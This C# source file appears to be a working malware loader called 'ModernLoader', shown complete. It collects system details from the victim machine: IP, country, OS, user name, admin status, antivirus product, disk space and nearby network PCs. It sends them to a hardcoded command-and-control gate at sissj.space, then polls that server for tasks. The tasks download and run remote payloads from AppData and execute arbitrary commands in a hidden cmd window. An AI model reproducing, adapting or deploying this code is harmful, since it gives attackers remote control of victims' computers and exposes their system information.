using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Principal;
using System.Threading;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ModernLoader
{
	public static class Loader
	{
		public static void Main() {Loader.Init(Loader.GetInitInfo());}
		public static void Init(string initInfo)
		{
			string value = string.Empty;
			Stopwatch stopwatch = Stopwatch.StartNew();
			do
			{
				try
				{
					HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Loader.server);
					httpWebRequest.ContentType = "application/json";
					httpWebRequest.Method = "POST";
					Console.WriteLine(initInfo);
					using (StreamWriter streamWriter = new StreamWriter(httpWebRequest.GetRequestStream())) { streamWriter.Write(initInfo); }
					try
					{
						HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
						Console.WriteLine("[INFO] Init Completed");
						StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
						string text = streamReader.ReadToEnd();
						Console.WriteLine("[DEBUG] Init Response: " + text);
						string[] array = text.Split(new char[] {';'});
						value = string.Empty;
						foreach (string json in array) 	{ Loader.DoTask(json); }
						Loader.Listen();
						Thread.Sleep(Loader.interval * 1000);
					}
					catch
					{
						value = "[ERROR] Reading Response Failed";
						Console.WriteLine(value);
						Thread.Sleep(Loader.interval * 100);
					}
				}
				catch
				{
					value = "[ERROR] Creating Request Failed";
					Console.WriteLine(value);
					Thread.Sleep(Loader.interval * 100);
				}
			}
			while (!Loader.terminate);
			stopwatch.Stop();
		}
		public static void Listen()
		{
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Loader.server);
				httpWebRequest.Accept = "application/json";
				httpWebRequest.Headers.Add("UUID", Loader.GetUUID());
				httpWebRequest.Method = "POST";
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				Console.WriteLine("[INFO] Listening...");
				StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
				string text = streamReader.ReadToEnd();
				Console.WriteLine("[INFO] Listen Response: " + text);
				string[] array = text.Split(new char[]{';'});
				foreach (string json in array) { Loader.DoTask(json); }
			}
			catch { Console.WriteLine("[ERROR] Listen Failed"); }
		}
		public static void DoTask(string json)
		{
			try
			{
				Dictionary<string, string> dictionary = Loader.JsonParse(json);
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(Loader.server);
				httpWebRequest.Headers.Add("UUID", Loader.GetUUID());
				httpWebRequest.Headers.Add("Completed", dictionary["TaskID"]);
				httpWebRequest.Method = "POST";
				bool flag = false;
				string text = dictionary["Type"];
				if (text != null)
				{
					if (text == "Download & Execute")
					{
						flag = Loader.Download(Loader.defaultPath, dictionary["Content"]);
						Console.WriteLine(string.Concat(new object[] { "DL <", dictionary["Content"], "> result: ", flag }));
						if (flag) { flag = Loader.Run(Loader.defaultPath, Loader.GetFilenameFromURL(dictionary["Content"])); }
						goto flag_C2;
					}
					if (text == "Execute")
					{
						flag = Loader.Execute(dictionary["Content"]);
						goto flag_C2;
					}
					if (text == "Download")
					{
						flag = Loader.Download(Loader.defaultPath, dictionary["Content"]);
						goto flag_C2;
					}
					if (text == "Terminate")
					{
						Loader.terminate = true;
						flag = Loader.terminate;
						goto flag_C2;
					}
					if (text == "Autorun") { goto flag_C2; }
				}
				flag = false;
				flag_C2:
				if (flag)
				{
					HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
					StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream());
					string text2 = streamReader.ReadToEnd();
				}
				else
				{
					httpWebRequest.Headers.Add("Error", "true");
					HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				}
			}
			catch	{Console.WriteLine("[INFO] No Available Tasks");}
		}
		public static bool Execute(string command)
		{
			bool result;
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo("cmd", "/c " + command)
				{
					RedirectStandardError = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using (Process process = new Process())
				{
					process.StartInfo = startInfo;
					process.Start();
					string value = process.StandardOutput.ReadToEnd();
					if (string.IsNullOrEmpty(value)) 	{ value = process.StandardError.ReadToEnd(); }
					result = true;
				}
			}
			catch { result = false; }
			return result;
		}
		public static bool Run(string path, string file)
		{
			bool result;
			try
			{
				ProcessStartInfo startInfo = new ProcessStartInfo("cmd", string.Concat(new string[]{"/c \"",path,"\\",file,"\""}))
				{
					RedirectStandardError = true,
					RedirectStandardOutput = true,
					UseShellExecute = false,
					CreateNoWindow = true
				};
				using (Process process = new Process())
				{
					process.StartInfo = startInfo;
					process.Start();
					result = true;
				}
			}
			catch	{result = false;}
			return result;
		}
		public static bool Download(string path, string url)
		{
			bool result;
			try
			{
				string filenameFromURL = Loader.GetFilenameFromURL(url);
				WebClient webClient = new WebClient();
				webClient.DownloadFile(url, path + "\\" + filenameFromURL);
				result = true;
			}
			catch{result = false;}
			return result;
		}
		public static string GetFilenameFromURL(string url){return url.Split(new char[]{'/'})[url.Split(new char[]{'/'}).Length - 1];}
		public static Dictionary<string, string> JsonParse(string json)
		{
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			string[] array = json.Split(new char[]{','});
			string text = string.Empty;
			string text2 = string.Empty;
			foreach (string text3 in array)
			{
				text = text3.Replace("{", "").Replace("\"", "").Replace("}", "").Split(new char[]{':'})[0];
				text2 = text3.Replace("{", "").Replace("\"", "").Replace("}", "").Replace("http:", "http").Replace("https:", "https").Split(new char[]{':'})[1];
				dictionary.Add(text.Trim(), text2.Replace("http", "http:").Replace("http:s", "https:").Replace("\\/", "/").Trim());
			}
			return dictionary;
		}
		public static string GetInitInfo()
		{
			string text = string.Empty;
			text = text + "{\"UUID\":\"" + Loader.GetUUID() + "\",";
			text = text + "\"IP\":\"" + new WebClient().DownloadString("http://ipinfo.io/ip").Trim() + "\",";
			text = text + "\"Country\":\"" + new WebClient().DownloadString("http://ipinfo.io/country").Trim() + "\",";
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem").Get().GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					ManagementObject managementObject = (ManagementObject)enumerator.Current;
					text = text + "\"OS\":\"" + ((managementObject["Caption"] != null) ? managementObject["Caption"].ToString().Replace("Microsoft ", "") : "N/A") + "\",";
				}
			}
			using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("select * from Win32_Processor").Get().GetEnumerator())
			{
				if (enumerator.MoveNext())
				{
					ManagementObject managementObject2 = (ManagementObject)enumerator.Current;
					text = text + "\"Arch\":\"x" + Convert.ToInt32(managementObject2["AddressWidth"]).ToString() + "\",";
				}
			}
			text = text + "\"User\":\"" + WindowsIdentity.GetCurrent().Name.Replace("\\", "/").ToString() + "\",";
			text = text + "\"CPU\":\"" + Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\SYSTEM\\CENTRALPROCESSOR\\0", "ProcessorNameString", null).ToString() + "\",";
			ulong totalPhysicalMemory = new ComputerInfo().TotalPhysicalMemory;
			text = text + "\"RAM\":\"" + (totalPhysicalMemory / 1024UL / 1024UL).ToString() + " MB\",";
			WindowsIdentity current = WindowsIdentity.GetCurrent();
			WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
			bool flag = windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
			if (flag){text += "\"Role\":\"Admin\",";}
			else{text += "\"Role\":\"User\",";}
			try
			{
				string text2 = string.Empty;
				foreach (ManagementBaseObject managementBaseObject in new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntivirusProduct").Get())
				{
					ManagementObject managementObject3 = (ManagementObject)managementBaseObject;
					text2 = managementObject3["displayName"].ToString();
				}
				if (text2.Length < 2){text += "\"AntiVirus\":\"N/A\",";}
				else{text = text + "\"AntiVirus\":\"" + text2 + "\",";}
			}
			catch{text += "\"AntiVirus\":\"N/A\",";}
			long num = 0L;
			foreach (DriveInfo driveInfo in DriveInfo.GetDrives()){if (driveInfo.IsReady)	{num += driveInfo.TotalSize;}}
			text = text + "\"Total Space\":\"" + (num / 1024L / 1024L / 1024L).ToString() + " GB\",";
			text = text + "\"Version\":\"" + Loader.version + "\",";
			List<string> list = new List<string>();
			using (DirectoryEntry directoryEntry = new DirectoryEntry("WinNT:"))
			{
				foreach (object obj in directoryEntry.Children)
				{
					DirectoryEntry directoryEntry2 = (DirectoryEntry)obj;
					foreach (object obj2 in directoryEntry2.Children)
					{
						DirectoryEntry directoryEntry3 = (DirectoryEntry)obj2;
						if (directoryEntry3.Name != "Schema"){list.Add(directoryEntry3.Name);}
					}
				}
			}
			if (list.Count == 0){text += "\"Network PCs\":\"N/A\"}";}
			else{text = text + "\"Network PCs\":\"" + list.Count.ToString() + "\"}";}
			Console.WriteLine(text);
			return text;
		}
		public static string GetUUID()
		{
			try
			{
				string arg = "localhost";
				ManagementScope managementScope = new ManagementScope(string.Format("\\\\{0}\\root\\CIMV2", arg), null);
				managementScope.Connect();
				ObjectQuery query = new ObjectQuery("SELECT UUID FROM Win32_ComputerSystemProduct");
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(managementScope, query);
				using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
				{
					if (enumerator.MoveNext())
					{
						ManagementObject managementObject = (ManagementObject)enumerator.Current;
						return managementObject["UUID"].ToString();
					}
				}
			}
			catch{return "N/A";}
			return "N/A";
		}
		public static string version = "Dorway";
		public static string server = "http://sissj.space/8/gate.php";
		public static string defaultPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		public static bool terminate = false;
		public static int interval = 240;
	}
}
